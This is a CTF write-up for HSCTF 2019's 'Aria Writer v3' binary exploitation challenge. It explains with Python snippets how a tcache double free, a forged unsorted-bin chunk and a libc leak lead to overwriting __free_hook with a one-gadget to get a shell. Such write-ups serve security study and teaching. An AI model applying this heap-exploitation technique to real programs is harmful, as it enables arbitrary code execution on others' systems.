HSCTF 2019

Aria Writer v3

After all that writing, Rob's gone blind. He still needs to finish this song though :(

Binary Exploitation

468 points


# Summary

Rob can write and discard drafts, thus allowing for the allocation of chunks smaller than 420 bytes with values of our choosing, as well as the freeing of the current chunk. Unlike Aria Writer v1, there is no longer a limitation on the number of times we discard our letter; however, there is a limitation on the number of letters we can write.

There happens to be a global array `curr`, with

* `curr[0]` being the pointer for `malloc()` and `free()`
	
* `curr[1]` and beyond being the name. For convenience, I will refer to this as `name` (0x602048).

# Vulnerability

As with Aria Writer v1, the tcache double free vulnerability can be exploited to write into an arbitrary location. To reduce redundancy, I implemented this under a function called `tcache_write`.

```python
def tcache_write(block_size, target, new_value):
    '''
    Exploits tcache double free to write into arbitary location

    Args:
        block_size - size of memory block to be allocated
        block_size - size of memory block to be allocated
        target - target address to be overwritten. Must be aligned to 0x10
        new_value - the value to be written to target address
    '''
    malloc(block_size, '')
    free()
    free()
    malloc(block_size, p64(target))
    malloc(block_size, '')
    malloc(block_size, new_value)
	
```

`block_size` does not matter as long as it uses a different tcache bin for every call. Using different bins may not be neccessary, but it is a good safety measure, since the target location might have some random value that will be copied into the tcache bin.

# Exploit

The idea is to overwrite `__free_hook` with one gadget, which requires leaking the location of libc.

Since Aria Writer v3 does not limit the number of times option 2 is chosen, leaking `main_arena` might be doable through the fd and bk pointers of small bin. However, I forged a large chunk instead and placed it in the unsorted bin because my solution was modified from that of Aria Writer v1.

For a chunk to be placed in the unsorted bin, it must

* not be on the top of the heap, or else it will be merged with the top chunk rather than stored in a bin. The heap manager will check whether the next chunk is in use to decide whether to merge the large chunk with the next chunk, and each chunk stores information on whether the previous chunk is free in the P flag. Thus, we will forge two small chunks after it.
* not fit into any tcache bins. There are 40 tcache bins, starting with 0x10 and incrementing by 0x10. Thus, the forged chunk should have a size greater than 0x410. I went with 0x420.

There is ample space in the data segment to hold the forged chunk. The forged chunk is in the location of `name` because `name` is printed at every turn, giving us a means of viewing the leak.

```python
# 1. prepare the chunk header for the forged chunk with size of 0x420
#    0x421 will be read into address 0x602048 (name)
conn.send(p64(0x421) + '\n')
name = 0x602040   # use 0x602040 from now on since malloc expect the buffer to be aligned to 0x10

# 2. forge small chunks at 'name + 0x420' to satisify unsorted bin conditions
tcache_write(0x60, name + 0x420, p64(0)+p64(0x21)+'c'*0x10+p64(0x20)+p64(0x21))

# 3. instantiate chunk 0x602050 with 0x420 bytes
tcache_write(0x70, name + 0x10, '')

```

With these conditions met, we free, consequently placing the forged chunk into the unsorted bin.

```python
free()

```

Since the forged chunk is the only chunk in the unsorted bin, both the forward and back pointers should point to somewhere in `main_arena`.
Unfortunately, we can't obtain our leak just yet, as the string terminates early due to a null byte. It prints the ascii representation of `0x21 0x04`.

In Aria Writer v1, there was a secret option 3 that printed 200 characters of `name`. Unfortunately, we don't have that luxury here and thus must find a different way to circumvent this.

I made a request for an arbitrary amount of memory. Size does not matter as long as it fits in a tcache bin. Its contents must not exceed 7 bytes, as explained later.

```python
malloc(0x10, '')
```

After the allocation, the memory layout will be:

	0x602040 -> 0x602050        0x0021              [chunk_header for 0x10 alloc]
	
	0x602050 -> xxxxxxxx        main_arena+0x50     [fd and bk (unlinked from main_arena)]
	
	0x602060 -> 0x602040        0x0401		[chunk_header for the remainder]
	
	0x602070 -> main_arena+0x60 main_arena+0x60     [fd and bk (linked into main_arena)]
	
Note that ```fd``` is corrupted by the '\n'. Thus, the string we pass in must not exceed 7 bytes, or else ```bk``` will also be corrupted.


From here, I overwrote everything leading up to the second pointer with filler.

```python
tcache_write(0x30, name, 'a' * 0x17)
```

As the null terminator is now gone, `main_arena` should be printed properly on the next turn.

We calculate the address of libc from offsets found under the debugger and overwrite `__free_hook` with our one gadget.

```python
tcache_write(0x90, free_hook, p64(libc_address + one_gadget))
```

Another call to free will trigger `__free_hook`, and our one gadget will be called to get into the shell.